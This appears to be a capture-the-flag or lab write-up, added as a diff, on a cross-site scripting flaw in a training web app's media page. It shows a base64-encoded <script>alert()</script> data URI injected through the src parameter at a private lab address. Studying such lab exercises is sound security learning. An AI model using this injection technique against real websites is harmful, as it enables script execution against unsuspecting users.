@@ -1,0 +1,17 @@
+# /?page=media&src=nsa
+
+# the image "nsa_prism.jpg" is in an <object> tag
+# <object> can load data directly in base64
+
+
+# we can try to convert some text to base64 and use it as data :
+<script>alert()</script>
+
+in base64 :
+data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
+
+
+try :
+http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
+
+Done !
